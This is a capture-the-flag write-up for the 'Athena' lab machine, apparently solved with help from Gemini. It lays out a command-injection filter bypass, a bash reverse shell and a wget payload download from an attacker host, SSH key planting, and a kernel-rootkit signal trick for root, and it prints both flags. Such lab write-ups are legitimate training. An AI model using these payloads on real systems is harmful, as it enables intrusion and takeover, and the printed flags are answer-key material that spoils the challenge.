# Athena CTF Writeup
(*solved using gemini 🤖🤖🤖*)
## Target Information
* **IP Address:** `10.48.183.110`
* **OS:** Linux (Ubuntu 20.04.6 LTS)

## 1. Reconnaissance & Enumeration

The first step was to perform a port scan to identify open services on the target machine. Initial ping probes were blocked, so the scan was run with ping discovery disabled (`-Pn`).

```bash
nmap -Pn -sV -sC -p- -T4 --min-rate 1000 -oA nmap_full 10.48.183.110
```

**Open Ports:**
* `22/tcp`: SSH (OpenSSH 8.2p1)
* `80/tcp`: HTTP (Apache httpd 2.4.41)
* `139/tcp`: netbios-ssn (Samba smbd 4)
* `445/tcp`: netbios-ssn (Samba smbd 4)

### SMB Enumeration
With SMB ports open, I listed the available shares using anonymous login.

```bash
smbclient -L //10.48.183.110 -N
```
This revealed a share named `public`. I connected to it and listed the contents:

```bash
smbclient //10.48.183.110/public -N -c "ls"
```
There was a file named `msg_for_administrator.txt`. I downloaded and read it:

```text
Dear Administrator,

I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel

Yours sincerely,

Athena
Intern
```

### Web Enumeration
The message pointed to `/myrouterpanel` on the web server. Browsing to `http://10.48.183.110/myrouterpanel/` revealed a "Simple Router Panel" with a "Ping Tool".

## 2. Exploitation (User Access)

### OS Command Injection
The Ping Tool took an IP address as input and executed a `ping` command. I tested it for OS Command Injection by appending shell commands.

Testing with a semicolon (`;whoami`) resulted in an "Attempt hacking!" message, indicating some form of input validation or blacklisting. 

However, using a URL-encoded newline character (`%0a`) successfully bypassed the filter.

```bash
# Bypass verification and command execution
curl -s -X POST -d "ip=127.0.0.1%0awhoami&submit=" http://10.48.183.110/myrouterpanel/ping.php
```
The output revealed the application was running as `www-data`.

### Gaining a Reverse Shell
Initial attempts to establish a reverse shell using `nc -e /bin/bash` and a standard bash FIFO payload directly via command injection failed or hung. 

To overcome this, I created a reverse shell script (`shell.sh`) locally, hosted it using a Python HTTP server, and then downloaded and executed it on the target via the command injection vulnerability.

**Local `shell.sh`:**
```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/192.168.131.247/5555 0>&1'
```

**Local HTTP Server:**
```bash
python3 -m http.server 8001
```

I discovered another interesting mechanism during enumeration. The user `athena` had a scheduled systemd service (`athena_backup.service`) that ran a backup script located at `/usr/share/backup/backup.sh` every minute.

The `www-data` user had write permissions to this file!

Instead of a direct reverse shell, I used the command injection to overwrite `/usr/share/backup/backup.sh` with my reverse shell script using `wget`. This caused the systemd service to execute my payload as the user `athena`.

```bash
# Overwrite the backup script via command injection
curl -s -X POST -d "ip=127.0.0.1%0awget+http%3a//192.168.131.247%3a8001/shell.sh+-O+/usr/share/backup/backup.sh&submit=" http://10.48.183.110/myrouterpanel/ping.php
```

Once the service triggered, I caught the reverse shell on my netcat listener (`nc -lvnp 5555`) as the user `athena`.

### Alternative: Direct SSH Access
To establish a more stable connection, I modified the `backup.sh` payload to inject my SSH public key into `athena`'s `~/.ssh/authorized_keys` file.

**SSH Key Injection Payload (`shell.sh`):**
```bash
#!/bin/bash
/bin/mkdir -p /home/athena/.ssh
/bin/chmod 700 /home/athena/.ssh
echo 'ssh-rsa AAAAB3Nza...[My Public Key]... kali@kali' > /home/athena/.ssh/authorized_keys
/bin/chmod 600 /home/athena/.ssh/authorized_keys
```

After deploying this and waiting for the service to run, I logged in via SSH directly:
```bash
ssh -i ~/.ssh/id_rsa athena@10.48.183.110
```

I then retrieved the user flag:
```bash
cat /home/athena/user.txt
# Flag: 857c4a4fbac638afb6c7ee45eb3e1a28
```

## 3. Privilege Escalation (Root Access)

Checking `sudo` privileges for the `athena` user revealed an interesting entry:

```bash
sudo -l
# Output:
# User athena may run the following commands on routerpanel:
#     (root) NOPASSWD: /usr/sbin/insmod /mnt/.../secret/venom.ko
```

The user could load a specific kernel module (`venom.ko`) as root without a password. The module was located at `/mnt/.../secret/venom.ko`.

### Analyzing the Kernel Module
I checked the module's details using `modinfo` and `strings`:

```bash
modinfo /mnt/.../secret/venom.ko
# Identified as "LKM rootkit" authored by "m0nad", heavily suggesting it's based on Diamorphine.

strings /mnt/.../secret/venom.ko | grep give_root
# Confirmed the presence of privilege escalation functionality.
```

Diamorphine is a well-known Linux Kernel Module (LKM) rootkit. It typically works by hooking system calls. A user can interact with it by sending specific signals to processes. For instance, sending a specific signal (often 64) to any process can grant the calling user root privileges.

### Triggering the Rootkit
I first needed to ensure the module was loaded. I loaded it using the allowed `sudo` command:

```bash
sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
```
*(Note: If it errors with "Invalid parameters", it might already be loaded or require a specific unhide signal first).*

To verify it was active (as Diamorphine hides itself from `lsmod`), I sent the default "unhide" signal (63) and checked `lsmod` again:

```bash
kill -63 0 && lsmod | grep venom
```
The module `venom` appeared, confirming it was loaded and responsive to signals.

Next, I needed to trigger the `give_root` function. The standard signal for Diamorphine is 64, but variants often change this. I wrote a small C program to test sending signals to itself, then executing a command if successful.

Testing signal 64 resulted in a "Real-time signal 30" error. I then tested signal 57, another common variant signal:

**Exploit Code (`/tmp/exploit.c`):**
```c
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

int main() {
    kill(getpid(), 57); // Send signal 57 to trigger give_root
    system("id > /tmp/root.txt");
    system("cat /root/root.txt >> /tmp/root.txt 2>/dev/null");
    system("chmod 666 /tmp/root.txt");
    return 0;
}
```

```bash
# Compile and run
gcc /tmp/exploit.c -o /tmp/exploit && /tmp/exploit && cat /tmp/root.txt
```

**Output:**
```
uid=0(root) gid=0(root) groups=0(root),1001(athena)
aecd4a3497cd2ec4bc71a2315030bd48
```

Signal 57 successfully elevated the process's privileges to `root` (`uid=0`), allowing it to read the root flag.

**Root Flag:** `aecd4a3497cd2ec4bc71a2315030bd48`

## Summary
The Athena machine involved exploiting an OS Command Injection vulnerability in a PHP ping tool, bypassing basic filtering. This allowed writing a malicious payload to a backup script executed via a systemd timer by another user. Privilege escalation was achieved by analyzing and exploiting a custom Linux Kernel Module (LKM) rootkit (a Diamorphine variant) that the user was allowed to load via `sudo`, triggering its hidden privilege escalation function by sending a specific signal (57).
